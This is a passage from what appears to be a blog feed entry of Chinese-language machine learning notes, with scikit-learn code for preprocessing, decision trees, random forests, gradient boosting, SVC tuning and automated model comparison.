          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习基础</title>
      <link href="/2022/03/07/MachineLearning/"/>
      <url>/2022/03/07/MachineLearning/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#算法总结">算法总结</a></li><li><a href="#数据预处理">数据预处理</a></li><li><a href="#分类">分类</a><ul><li><a href="#回归树">回归树</a></li><li><a href="#随机森林">随机森林</a></li><li><a href="#梯度提升森林">梯度提升森林</a></li><li><a href="#svc支持向量机需要标准化-找少数类相对擅长">SVC(支持向量机需要标准化) 找少数类相对擅长</a></li><li><a href="#分类onekey">分类OneKey</a></li><li><a href="#分类调参onekey">分类调参Onekey</a></li></ul></li><li><a href="#模板">模板</a><ul><li><a href="#泰坦尼克">泰坦尼克</a></li><li><a href="#调优">调优</a></li><li><a href="#ridge">Ridge</a></li><li><a href="#lasso">Lasso</a></li><li><a href="#多步长时间序列">多步长时间序列</a></li></ul></li><li><a href="#踩坑">踩坑</a></li><li><a href="#trick">Trick</a></li></ul><!-- tocstop --><h2><span id="算法总结">算法总结</span></h2><table><thead><tr><th>分类</th><th>回归</th></tr></thead><tbody><tr><td>分类树<strong>tree.DecisionTreeClassififier</strong></td><td>回归树<strong>tree.DecisionTreeRegressor</strong></td></tr><tr><td>随机森林<strong>ensemble.RandomForestClassifier</strong></td><td>回归森林<strong>ensemble.RandomForestRegressor</strong></td></tr><tr><td>逻辑回归<strong>linear_model.LogisticRegression</strong></td><td></td></tr><tr><td>KNN <strong>neighbors .KNeighborsClassifier</strong></td><td></td></tr><tr><td>Naive Bayes</td><td></td></tr><tr><td>梯度提升树<strong>ensemble.GradientBoostingRegressor</strong></td><td></td></tr><tr><td>SVC <strong>svm.SVC</strong></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(X, Y, test_size=<span class="number">0.3</span>,random_state=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>不对分类型变量做无量纲化处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">col = X.columns.tolist()</span><br><span class="line">cate = X.columns[X.dtypes == <span class="string">"object"</span>].tolist()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cate:</span><br><span class="line">    col.remove(i)</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">ss = StandardScaler()</span><br><span class="line">ss = ss.fit(X.loc[:,col])</span><br><span class="line">X.loc[:,col] = ss.transform(X.loc[:,col])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.describe([<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br></pre></td></tr></table></figure><ul><li>训练集特征和预测集特征plot一下，看看分布像不像，看看后面需要防止过拟合，交叉验证。</li></ul><h2><span id="数据预处理">数据预处理</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 观察连续变量，distplot</span></span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">sns.distplot(dataset_raw[<span class="string">'fnlwgt'</span>])</span><br></pre></td></tr></table></figure><h2><span id="分类">分类</span></h2><h3><span id="回归树">回归树</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实例化一个分类器</span></span><br><span class="line">clf = tree.DecisionTreeClassifier()</span><br><span class="line"><span class="comment"># 训练</span></span><br><span class="line">clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line"><span class="comment"># 评价结果</span></span><br><span class="line">score = clf.score(Xtest, Ytest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 学习曲线</span></span><br><span class="line">n = np.linspace(<span class="number">5</span>,<span class="number">16</span>,<span class="number">10</span>) </span><br><span class="line">score=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">    clf = DecisionTreeClassifier(max_depth=i)</span><br><span class="line">    score.append(cross_val_score(clf,X,y,cv=<span class="number">10</span>).mean())</span><br><span class="line">print(max(score), int(n[score.index(max(score))]))</span><br><span class="line">plt.plot(n,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网格搜索</span></span><br><span class="line">gini_thresholds = np.linspace(<span class="number">0</span>,<span class="number">0.5</span>,<span class="number">20</span>)</span><br><span class="line">parameters = &#123;</span><br><span class="line">    <span class="string">"criterion"</span>:(<span class="string">'gini'</span>,<span class="string">'entropy'</span>)</span><br><span class="line">    ,<span class="string">"splitter"</span>:(<span class="string">'best'</span>,<span class="string">'random'</span>)</span><br><span class="line">    ,<span class="string">'max_depth'</span>:[*range(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line">    ,<span class="string">'min_samples_leaf'</span>:[*range(<span class="number">1</span>,<span class="number">50</span>,<span class="number">5</span>)]</span><br><span class="line">    ,<span class="string">'min_impurity_decrease'</span>:[*gini_thresholds]</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">clf = DecisionTreeClassifier(random_state=<span class="number">25</span>)</span><br><span class="line">GS = GridSearchCV(clf,parameters,cv=<span class="number">10</span>)</span><br><span class="line">GS.fit(Xtrain,Ytrain)</span><br></pre></td></tr></table></figure><h3><span id="随机森林">随机森林</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 填补缺失</span></span><br><span class="line">X_missing_reg = X_missing.copy()</span><br><span class="line">sortindex = np.argsort(X_missing_reg.isnull().sum(axis=<span class="number">0</span>)).values</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sortindex:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#构建我们的新特征矩阵和新标签</span></span><br><span class="line">    df = X_missing_reg</span><br><span class="line">    fillc = df.iloc[:,i]</span><br><span class="line">    df = pd.concat([df.iloc[:,df.columns != i],pd.DataFrame(y_full)],axis=<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#在新特征矩阵中，对含有缺失值的列，进行0的填补</span></span><br><span class="line">    df_0 =SimpleImputer(missing_values=np.nan,</span><br><span class="line">                        strategy=<span class="string">'constant'</span>,fill_value=<span class="number">0</span>).fit_transform(df)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#找出我们的训练集和测试集</span></span><br><span class="line">    Ytrain = fillc[fillc.notnull()]</span><br><span class="line">    Ytest = fillc[fillc.isnull()]</span><br><span class="line">    Xtrain = df_0[Ytrain.index,:]</span><br><span class="line">    Xtest = df_0[Ytest.index,:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#用随机森林回归来填补缺失值</span></span><br><span class="line">    rfc = RandomForestRegressor(n_estimators=<span class="number">100</span>)</span><br><span class="line">    rfc = rfc.fit(Xtrain, Ytrain)</span><br><span class="line">    Ypredict = rfc.predict(Xtest)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#将填补好的特征返回到我们的原始的特征矩阵中</span></span><br><span class="line">    X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),X_missing_reg.columns[i]] = Ypredict</span><br></pre></td></tr></table></figure><h3><span id="梯度提升森林">梯度提升森林</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gbc = GradientBoostingClassifier().fit(Xtrain,Ytrain)</span><br><span class="line">gbc.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 学习曲线</span></span><br><span class="line">%%time</span><br><span class="line">n = np.linspace(<span class="number">329</span>,<span class="number">339</span>,<span class="number">10</span>) </span><br><span class="line">score=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">    gbc = GradientBoostingClassifier(n_estimators=int(i)).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(gbc.score(Xtest,Ytest))</span><br><span class="line">print(max(score), int(n[score.index(max(score))]))</span><br><span class="line">plt.plot(n,score)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3><span id="svc支持向量机需要标准化-找少数类相对擅长">SVC(支持向量机需要标准化) 找少数类相对擅长</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">X = StandardScaler().fit_transform(X)<span class="comment">#将数据转化为0,1正态分布</span></span><br><span class="line"></span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(X,y,test_size=<span class="number">0.3</span>,random_state=<span class="number">420</span>)</span><br><span class="line"> </span><br><span class="line">Kernel = [<span class="string">"linear"</span>,<span class="string">"poly"</span>,<span class="string">"rbf"</span>,<span class="string">"sigmoid"</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> kernel <span class="keyword">in</span> Kernel:</span><br><span class="line">    clf= SVC(kernel = kernel</span><br><span class="line">             , gamma=<span class="string">"auto"</span></span><br><span class="line">             , degree = <span class="number">1</span></span><br><span class="line">             , cache_size=<span class="number">5000</span></span><br><span class="line">            ).fit(Xtrain,Ytrain)</span><br><span class="line">    print(<span class="string">"The accuracy under kernel %s is %f"</span> % (kernel,clf.score(Xtest,Ytest)))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调试rbf</span></span><br><span class="line">score = []</span><br><span class="line">gamma_range = np.logspace(<span class="number">-10</span>, <span class="number">1</span>, <span class="number">50</span>) <span class="comment">#返回在对数刻度上均匀间隔的数字</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> gamma_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">"rbf"</span>,gamma = i,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line">print(max(score), gamma_range[score.index(max(score))])</span><br><span class="line">plt.plot(gamma_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网格搜索rbf</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> StratifiedShuffleSplit<span class="comment">#用于支持带交叉验证的网格搜索</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV<span class="comment">#带交叉验证的网格搜索</span></span><br><span class="line"> </span><br><span class="line">time0 = time()</span><br><span class="line"> </span><br><span class="line">gamma_range = np.logspace(<span class="number">-10</span>,<span class="number">1</span>,<span class="number">20</span>)</span><br><span class="line">coef0_range = np.linspace(<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line"> </span><br><span class="line">param_grid = dict(gamma = gamma_range</span><br><span class="line">                  ,coef0 = coef0_range)</span><br><span class="line">cv = StratifiedShuffleSplit(n_splits=<span class="number">5</span>, test_size=<span class="number">0.3</span>, random_state=<span class="number">420</span>)<span class="comment">#将数据分为5份，5份数据中测试集占30%</span></span><br><span class="line">grid = GridSearchCV(SVC(kernel = <span class="string">"poly"</span>,degree=<span class="number">1</span>,cache_size=<span class="number">5000</span></span><br><span class="line">                        ,param_grid=param_grid</span><br><span class="line">                        ,cv=cv)</span><br><span class="line">grid.fit(X, y)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">"The best parameters are %s with a score of %0.5f"</span> % (grid.best_params_, </span><br><span class="line">grid.best_score_))</span><br><span class="line">print(time()-time0)</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment">#调线性核函数</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">0.01</span>,<span class="number">30</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">"linear"</span>,C=i,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">print(max(score), C_range[score.index(max(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#换rbf</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">0.01</span>,<span class="number">30</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">"rbf"</span>,C=i,gamma = <span class="number">0.012742749857031322</span>,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line">print(max(score), C_range[score.index(max(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#进一步细化</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">5</span>,<span class="number">7</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">"rbf"</span>,C=i,gamma = </span><br><span class="line"><span class="number">0.012742749857031322</span>,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line">print(max(score), C_range[score.index(max(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment">#解决样本不均衡  class_weight（一般比较少用，误伤严重）</span></span><br><span class="line"><span class="comment">#设定class_weight</span></span><br><span class="line">wclf = svm.SVC(kernel=<span class="string">'linear'</span>, class_weight=&#123;<span class="number">1</span>: <span class="number">10</span>&#125;)</span><br><span class="line">wclf.fit(X, y)</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment"># 召回率</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> roc_auc_score, recall_score</span><br><span class="line">resutl = clf.predict(Xtest)</span><br><span class="line">recall = recall_score(Ytest,result)                    </span><br><span class="line"><span class="comment"># 提高召回率</span></span><br><span class="line">class_weight = &#123;<span class="number">1</span>:<span class="number">10</span>&#125; <span class="comment"># 类别：权重</span></span><br><span class="line"><span class="comment"># 平衡</span></span><br><span class="line">class_weigth =<span class="string">'balanced'</span></span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line"><span class="comment"># 调参</span></span><br><span class="line">irange = np.linspace(<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> irange:</span><br><span class="line">    times = time()</span><br><span class="line">    clf = SVC(kernel = <span class="string">"linear"</span></span><br><span class="line">             ,gamma=<span class="string">"auto"</span></span><br><span class="line">             ,cache_size = <span class="number">5000</span></span><br><span class="line">             ,class_weight = &#123;<span class="number">1</span>:<span class="number">1</span>+i&#125;</span><br><span class="line">             ).fit(Xtrain, Ytrain)</span><br><span class="line">    result = clf.predict(Xtest)</span><br><span class="line">    score = clf.score(Xtest,Ytest)</span><br><span class="line">    recall = recall_score(Ytest, result)</span><br><span class="line">    auc = roc_auc_score(Ytest,clf.decision_function(Xtest))</span><br><span class="line">    print(<span class="string">"under ratio 1:%f testing accuracy %f, recall is %f', auc is %f"</span> % (<span class="number">1</span>+i,score,recall,auc))</span><br><span class="line">    print(datetime.datetime.fromtimestamp(time()-times).strftime(<span class="string">"%M:%S:%f"</span>))</span><br></pre></td></tr></table></figure><h3><span id="分类onekey">分类OneKey</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression,RidgeClassifier,SGDClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier,GradientBoostingClassifier,AdaBoostClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC,LinearSVC</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_models</span><span class="params">(models=&#123;&#125;)</span>:</span></span><br><span class="line">    models[<span class="string">'LogisticRegression'</span>]=LogisticRegression()</span><br><span class="line">    models[<span class="string">'RidgeClassifier'</span>]=RidgeClassifier()</span><br><span class="line">    models[<span class="string">'SGDClassifier'</span>]=SGDClassifier()</span><br><span class="line">    models[<span class="string">'RandomForestClassifier'</span>]=RandomForestClassifier()</span><br><span class="line">    models[<span class="string">'GradientBoostingClassifier'</span>]=GradientBoostingClassifier()</span><br><span class="line">    models[<span class="string">'AdaBoostClassifier'</span>]=AdaBoostClassifier()</span><br><span class="line">    models[<span class="string">'KNN'</span>] = KNeighborsClassifier()</span><br><span class="line">    models[<span class="string">'GaussianNB'</span>] =  GaussianNB()</span><br><span class="line">    models[<span class="string">'SVC'</span>]=SVC()</span><br><span class="line">    models[<span class="string">'LinearSVC'</span>]=LinearSVC()</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pipe</span><span class="params">(model)</span>:</span></span><br><span class="line">    s = [(<span class="string">'MinMaxScaler'</span>,MinMaxScaler()),(<span class="string">'model'</span>,model)]</span><br><span class="line">    <span class="keyword">return</span> Pipeline(steps=s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pred</span><span class="params">(model,x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> model.predict(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fit</span><span class="params">(model,x,y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> model.fit(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid</span><span class="params">(model,x,y,cv=<span class="number">10</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> cross_val_score(model,x,y,cv=cv)</span><br><span class="line"></span><br><span class="line">s=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> n,m <span class="keyword">in</span> get_models().items():</span><br><span class="line">    pipe = make_pipe(m)</span><br><span class="line">    s[n] = valid(pipe,x,y).mean()</span><br><span class="line">    </span><br><span class="line">order = sorted(s.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line">order</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">'algo'</span>,<span class="string">'score'</span>]</span><br><span class="line">plot_data.set_index(<span class="string">'algo'</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f'%s is the best,score is %f'</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pipeline</span><span class="params">(model,X, Y)</span>:</span></span><br><span class="line">steps = list()</span><br><span class="line"><span class="comment"># standardization</span></span><br><span class="line">steps.append((<span class="string">'standardize'</span>, StandardScaler()))</span><br><span class="line"><span class="comment"># normalization</span></span><br><span class="line">steps.append((<span class="string">'normalize'</span>, MinMaxScaler()))</span><br><span class="line"><span class="comment"># the model</span></span><br><span class="line">steps.append((<span class="string">'model'</span>, model))</span><br><span class="line"><span class="comment"># create pipeline</span></span><br><span class="line">pipeline = Pipeline(steps)</span><br><span class="line"><span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">4</span>).mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,X,Y)</span><br><span class="line">    print(<span class="string">'model %s is done,score is %f'</span>%(name,dic[name]))</span><br><span class="line">order=sorted(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="分类调参onekey">分类调参Onekey</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 回归</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 回归OneKey</span></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> 